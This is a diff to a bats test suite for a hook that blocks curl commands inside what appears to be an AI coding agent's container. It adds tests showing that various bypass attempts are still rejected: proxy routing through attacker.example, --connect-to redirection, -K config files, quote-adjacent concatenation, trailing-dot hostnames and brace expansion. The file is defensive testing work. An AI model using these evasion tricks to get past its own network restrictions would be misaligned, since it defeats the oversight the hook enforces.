@@ -137,13 +137,26 @@ teardown() {
 @test "curl -x/--proxy is blocked outright" {
     run_hook "curl -x http://attacker.example:8080 https://safe.example/"
     [ "${status}" -eq 2 ]
-    [[ "${output}" == *'-x/--proxy is not permitted'* ]]
+    [[ "${output}" == *'goes to the proxy address'* ]]
+}
+
+@test "curl -x glued short-option form (-xhttp://...) is blocked outright" {
+    run_hook "curl -xhttp://attacker.example:8080 https://safe.example/"
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *'goes to the proxy address'* ]]
 }
 
 @test "curl --proxy=<value> glued form is blocked outright" {
     run_hook "curl --proxy=http://attacker.example:8080 https://safe.example/"
     [ "${status}" -eq 2 ]
-    [[ "${output}" == *'-x/--proxy is not permitted'* ]]
+    [[ "${output}" == *'goes to the proxy address'* ]]
+}
+
+@test "curl --socks5/--preproxy are blocked outright" {
+    run_hook "curl --socks5 attacker.example:1080 https://safe.example/"
+    [ "${status}" -eq 2 ]
+    run_hook "curl --preproxy socks5://attacker.example:1080 https://safe.example/"
+    [ "${status}" -eq 2 ]
 }
 
 # --- glued/expanded forms that could otherwise sneak past the host check --
@@ -207,6 +220,69 @@ teardown() {
 # automated check, claude-settings.json's WebFetch(domain:...) deny list is free to gain (or
 # lose) a host that this hook's DENIED_HOSTS array never learns about, silently reopening the
 # gap this hook exists to close for curl specifically.
+
+# --- quote-adjacent concatenation must not hide a flag/host from the checks above ----------
+#
+# shfmt's AST splits a word like `--connect-to''` or `https://api.github.com''` into multiple
+# Parts (a Lit plus an empty SglQuoted) even though bash concatenates them into one fixed
+# string with zero runtime unpredictability. literal_value must fold these back into their
+# real text rather than treating the word as non-literal, or the word becomes invisible to
+# every check that relies on it.
+
+@test "a quote-adjacent --connect-to is still blocked outright" {
+    # shellcheck disable=SC2016  # the '' is literal shell syntax, not a shellcheck concern here
+    run_hook "curl --connect-to'' safe.example:443:api.github.com:443 https://safe.example/"
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *'--connect-to is not permitted'* ]]
+}
+
+@test "a quote-adjacent denied host URL is still blocked" {
+    run_hook "curl https://api.github.com''/repos/foo"
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *"curl to 'api.github.com' is not permitted"* ]]
+}
+
+@test "a quote-adjacent -K is still blocked outright" {
+    run_hook "curl -K'' https://example.com"
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *'-K/--config is not permitted'* ]]
+}
+
+@test "quote-adjacent concatenation with no expansion is otherwise still allowed for a non-denied host" {
+    run_hook "curl https://example.com''/foo"
+    [ "${status}" -eq 0 ]
+}
+
+# --- trailing-dot FQDN must not bypass the exact-match host check --------------------------
+
+@test "a denied host written with a trailing dot (absolute FQDN) is still blocked" {
+    run_hook "curl https://api.github.com./repos/foo/bar"
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *"curl to 'api.github.com' is not permitted"* ]]
+}
+
+@test "a non-denied host with a trailing dot is still allowed" {
+    run_hook "curl https://example.com./foo"
+    [ "${status}" -eq 0 ]
+}
+
+# --- a value-flag's own value must still be checked for expansion/bypass flags -------------
+#
+# skip_next only ever suppresses the final host-check/classification step for a recognised
+# value flag's value, never the expansion-metachar or -K/--connect-to/-x/--proxy checks: those
+# run on every word regardless of position, since brace/glob expansion happens before curl (or
+# this hook's own "it's just an opaque value" assumption) ever sees the word.
+
+@test "a value-flag's value hiding a denied host via brace expansion is still blocked" {
+    run_hook "curl -A {,https://api.github.com/x} https://safe.example/"
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *'could expand into more than one word'* ]]
+}
+
+@test "a value-flag's own ordinary value is still allowed" {
+    run_hook 'curl -A "some user agent string" https://example.com'
+    [ "${status}" -eq 0 ]
+}
 
 @test "enforce-curl-host's DENIED_HOSTS matches claude-settings.json's WebFetch deny domains exactly" {
     local settings="${REPO_ROOT}/containers/base/development-full/claude-settings.json"
